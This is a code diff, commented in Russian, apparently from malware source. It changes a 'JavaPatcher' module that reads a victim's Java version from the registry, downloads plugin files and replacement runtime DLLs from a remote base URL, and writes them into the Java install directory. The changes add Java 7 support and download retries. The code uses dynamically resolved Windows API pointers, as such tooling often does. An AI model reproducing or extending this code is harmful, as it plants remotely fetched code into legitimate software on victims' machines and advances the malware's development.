@@ -64,19 +64,18 @@ static bool GetJavaVersion()
 		m_lstrcpy( javaHome, s );
 		STR::Free(s);
 		DBG( "JavaPatcher", "java home: %s", javaHome );
-
-		char* ver2 = Registry::GetStringValue( HKEY_LOCAL_MACHINE, (PCHAR)nameKeyJava, "Java6FamilyVersion" );
-		fwsprintfA pwsprintfA = Get_wsprintfA();
-		pwsprintfA( javaMSI, "%s\\%s\\MSI", nameKeyJava, ver2 ); 
-
-		if( ver2 )
+		//конвертируем версию явы в целое число
+		char* p = STR::Scan( ver1, '.' );
+		if( p ) 
 		{
-			//конвертируем версию явы в целое число
-			char* p = STR::Scan( ver1, '.' );
-			if( p ) 
+			*p = 0;
+			javaVersion = StrToInt(ver1) * 100 + StrToInt(p + 1); //в результате получаем 1.6 в 106
+			const char* family = (javaVersion == 106) ? "Java6FamilyVersion" : "Java7FamilyVersion";
+			char* ver2 = Registry::GetStringValue( HKEY_LOCAL_MACHINE, (PCHAR)nameKeyJava, (char*)family );
+			fwsprintfA pwsprintfA = Get_wsprintfA();
+			pwsprintfA( javaMSI, "%s\\%s\\MSI", nameKeyJava, ver2 ); 
+			if( ver2 )
 			{
-				*p = 0;
-				javaVersion = StrToInt(ver1) * 100 + StrToInt(p + 1); //в результате получаем 1.6 в 106
 				//анализируем строку вида 1.6.0_30
 				p = STR::Scan( ver2, '.' );
 				if( p )
@@ -373,7 +372,9 @@ static bool DownloadPlugin( FILE_CRC32* filesCrc32, const char* baseUrl, const c
 			else
 				DBG( "JavaPatcher", "Error crc32 for %s", url );
 			STR::Free(data);
-			break;
+			data = 0;
+			if( res ) break;
+			pSleep(2000);
 		}
 		else
 		{
@@ -452,15 +453,16 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, fileName, crcName ) )
 		return false;
 
+	char* realName = 0;
 	switch( javaVersion )
 	{
-		case 106: addUrl = "6/msvcr71.dll"; crcName = "6_msvcr71.dll"; break;
-		case 107: addUrl = "7/msvcr71.dll"; crcName = "7_msvcr71.dll"; break;
+		case 106: realName = "msvcr71.dll"; addUrl = "6/msvcr71.dll"; crcName = "6_msvcr71.dll"; break;
+		case 107: realName = "msvcr100.dll"; addUrl = "7/msvcr100.dll"; crcName = "7_msvcr100.dll"; break;
 		default: addUrl = 0; crcName = 0; break;
 	}
 	if( addUrl == 0 ) return false;
 	m_lstrcpy( fileName, Path );
-	pPathAppendA( fileName, "msvcr71.dll" );
+	pPathAppendA( fileName, realName );
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, fileName, crcName ) )
 		return false;
 
